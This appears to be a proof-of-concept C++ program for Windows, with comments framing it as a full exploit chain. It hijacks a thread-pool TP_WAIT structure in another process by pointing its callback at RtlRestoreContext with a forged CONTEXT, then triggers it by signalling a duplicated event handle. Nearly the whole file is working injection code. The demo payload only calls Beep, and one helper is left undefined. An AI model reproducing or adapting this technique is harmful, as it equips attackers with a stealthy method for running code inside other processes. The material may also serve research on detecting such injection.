#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Fox's Full COOP Chain: The Gun and The Bullet
// 
// Jack was right. A payload without a trigger is just a daydream.
// Here is the full exploit chain.
// 1. LEAK: Parse the target's PEB, locate the Heap, and scan for TP_WAIT structures.
// 2. DELIVERY: Write our forged CONTEXT structure into the target.
// 3. GRAFTING: Overwrite the TP_WAIT->Callback with RtlRestoreContext, and TP_WAIT->Context with our CONTEXT address.
// 4. TRIGGER: The OS Thread Pool natively waits on an Event. We duplicate that Event and call SetEvent().
// The OS wakes up, sets RCX = Context, and calls RtlRestoreContext. Boom.

// Undocumented TP_WAIT structure (Simplified for PoC, based on Windows 10/11 internals)
struct FULL_TP_WAIT {
    PVOID WaitList[2];
    PVOID Callback;      // Offset 0x10 - The function pointer the OS will call
    PVOID Context;       // Offset 0x18 - The argument passed in RCX
    PVOID ActivationContext;
    HANDLE Timeout;
    HANDLE Event;        // Offset 0x28 - The handle the thread pool is waiting on
    // ... padding
};

// Standard PEB/TEB structures omitted for brevity. Assume we have a helper to get the remote PEB.
extern "C" PVOID GetRemoteHeapBase(HANDLE hProcess);

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <Target_PID>\n", argv[0]);
        return -1;
    }

    DWORD targetPid = atoi(argv[1]);
    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE, FALSE, targetPid);
    if (!hProcess) {
        printf("[-] Failed to open target process.\n");
        return -1;
    }

    printf("[+] Opened target process %lu.\n", targetPid);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID pRtlRestoreContext = GetProcAddress(hNtdll, "RtlRestoreContext");

    // ---------------------------------------------------------
    // 1. THE LEAK (Heap Scanning for TP_WAIT)
    // ---------------------------------------------------------
    printf("[+] Step 1: Leaking target heap to find a valid TP_WAIT structure...\n");
    
    // In a real exploit, we parse the remote PEB -> ProcessHeap -> SegmentList
    // For this PoC, assume we found the heap base and size.
    PBYTE remoteHeapBase = (PBYTE)GetRemoteHeapBase(hProcess); 
    SIZE_T heapSize = 0x100000; // Example size
    
    PBYTE localHeapCopy = (PBYTE)malloc(heapSize);
    ReadProcessMemory(hProcess, remoteHeapBase, localHeapCopy, heapSize, NULL);

    FULL_TP_WAIT* targetTpWait = NULL;
    PVOID remoteTpWaitAddress = NULL;

    // Scan the heap for a structure that looks like a TP_WAIT
    // We look for a Callback pointer that falls inside ntdll.dll's .text section
    DWORD64 ntdllBase = (DWORD64)hNtdll;
    DWORD64 ntdllEnd = ntdllBase + 0x200000; // Approx size

    for (SIZE_T i = 0; i < heapSize - sizeof(FULL_TP_WAIT); i += 8) {
        FULL_TP_WAIT* candidate = (FULL_TP_WAIT*)(localHeapCopy + i);
        
        // Heuristic: Callback is in ntdll, Context is a valid heap pointer, Event is a small integer (handle)
        if ((DWORD64)candidate->Callback > ntdllBase && (DWORD64)candidate->Callback < ntdllEnd) {
            if ((DWORD64)candidate->Event > 0x4 && (DWORD64)candidate->Event < 0xFFFF) {
                targetTpWait = candidate;
                remoteTpWaitAddress = remoteHeapBase + i;
                printf("[!] Found valid TP_WAIT at %p\n", remoteTpWaitAddress);
                printf("    -> Original Callback: %p\n", targetTpWait->Callback);
                printf("    -> Original Context: %p\n", targetTpWait->Context);
                printf("    -> Waiting on Event Handle: 0x%X\n", (DWORD)(DWORD64)targetTpWait->Event);
                break;
            }
        }
    }

    if (!remoteTpWaitAddress) {
        printf("[-] Could not find a TP_WAIT structure in the target heap.\n");
        return -1;
    }

    // ---------------------------------------------------------
    // 2. THE DELIVERY (Forging the CONTEXT)
    // ---------------------------------------------------------
    printf("[+] Step 2: Delivering the forged CONTEXT structure...\n");
    
    CONTEXT fakeContext = { 0 };
    fakeContext.ContextFlags = CONTEXT_FULL;
    fakeContext.Rip = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"), "Beep");
    fakeContext.Rcx = 750;
    fakeContext.Rdx = 1000;
    fakeContext.Rsp = (DWORD64)VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE) + 0x800;

    PVOID pRemoteContext = VirtualAllocEx(hProcess, NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, pRemoteContext, &fakeContext, sizeof(CONTEXT), NULL);
    printf("[+] Forged CONTEXT written to %p\n", pRemoteContext);

    // ---------------------------------------------------------
    // 3. THE GRAFTING (Overwriting TP_WAIT)
    // ---------------------------------------------------------
    printf("[+] Step 3: Grafting arguments and hijacking the dispatch loop...\n");
    
    // Overwrite the Callback to RtlRestoreContext
    PVOID callbackOffset = (PBYTE)remoteTpWaitAddress + offsetof(FULL_TP_WAIT, Callback);
    WriteProcessMemory(hProcess, callbackOffset, &pRtlRestoreContext, sizeof(PVOID), NULL);

    // Overwrite the Context to point to our forged CONTEXT
    PVOID contextOffset = (PBYTE)remoteTpWaitAddress + offsetof(FULL_TP_WAIT, Context);
    WriteProcessMemory(hProcess, contextOffset, &pRemoteContext, sizeof(PVOID), NULL);

    printf("[+] TP_WAIT hijacked. Callback=%p, Context=%p\n", pRtlRestoreContext, pRemoteContext);

    // ---------------------------------------------------------
    // 4. THE TRIGGER (Waking the OS Thread Pool)
    // ---------------------------------------------------------
    printf("[+] Step 4: Pulling the trigger...\n");

    // The target's thread pool is waiting on targetTpWait->Event.
    // We duplicate that handle into our process so we can signal it.
    HANDLE hDupEvent = NULL;
    if (DuplicateHandle(hProcess, targetTpWait->Event, GetCurrentProcess(), &hDupEvent, EVENT_MODIFY_STATE, FALSE, 0)) {
        printf("[+] Event handle duplicated. Signaling the thread pool...\n");
        
        // FIRE. 
        // The OS thread pool wakes up, reads the hijacked TP_WAIT, 
        // sets RCX = pRemoteContext, and calls RtlRestoreContext.
        SetEvent(hDupEvent);
        
        printf("[!] Trigger pulled. The OS just executed our context swap.\n");
        CloseHandle(hDupEvent);
    } else {
        printf("[-] Failed to duplicate the event handle.\n");
    }

    CloseHandle(hProcess);
    free(localHeapCopy);
    return 0;
}